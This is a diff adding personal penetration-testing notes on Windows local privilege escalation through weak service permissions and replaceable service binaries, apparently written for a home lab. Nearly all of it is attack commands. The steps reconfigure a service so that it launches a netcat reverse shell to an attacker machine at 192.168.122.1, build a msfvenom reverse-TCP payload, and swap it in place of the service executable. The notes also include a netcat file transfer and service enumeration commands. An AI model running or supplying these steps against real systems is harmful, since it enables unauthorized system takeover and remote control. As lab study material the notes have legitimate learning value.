@@ -171,3 +171,53 @@ https://xorond.com/posts/2021/04/windows-local-privilege-escalation/
 
 
 ###WEAK SERVICE PERMISION
+  Service Configuration
+    sc.exe qc SimpleService
+      >>>>accesschk64 
+        https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+    .\accesschk64.exe /accepteula -uwcqv SimpleService
+              Linux
+                  nc -lnvp 4321 < accesschk64.exe
+              Windows CMD
+                  cd Downloads
+                  .\nc64.exe 192.168.122.1 4321 > accesschk64.exe
+  as admin on cmd
+    sc.exe config SimpleService binpath="C:\users\quickemu\downloads\simpleService.exe"
+    sc.exe config SimpleService binpath="C:\users\quickemu\downloads\nc64.exe 192.168.122.1 4321 -e c:\windows\system32\cmd.exe"
+  on kali attacker
+    nc -nlvp 4321
+  as admin on cmd
+    sc.exe start simpleService
+  ###SO BASICALY WE CREATE A MALICIOUS EXECUTABLE THAT TRIGGERS A REVERSE SHELL AND WE UPLOAD IT TO THE VICTIM MACHINE
+      1$      
+      msfvenom -p windows/shlee_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
+      2>
+      sc.exe config SimpleService binpath="C:\users\quickemu\downloads\malicious.exe"
+      3$
+      nc -nlvp 7777
+      4>
+      sc.exe stop SimpleService
+      sc.exe start SimpleService
+      5*
+Service Binary
+  PS
+    Get-CimInstance -ClassName win32_service | select name,state,pathname | where-object {$_.State -like 'Running'}
+    icacls.exe .\simpleService.exe
+    1$      
+      msfvenom -p windows/shlee_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
+      2>
+      cp .\simpleService.exe .\simpleService.exe.bkp
+      cp .\malicious.exe .\simpleService.exe
+      3$
+      nc -nlvp 7777
+      ADMIN ON CMD
+      4>
+      sc.exe stop SimpleService
+      sc.exe start SimpleService
+      5*
+    
+
+  
+  Service enumeration with winPEAS
+
+
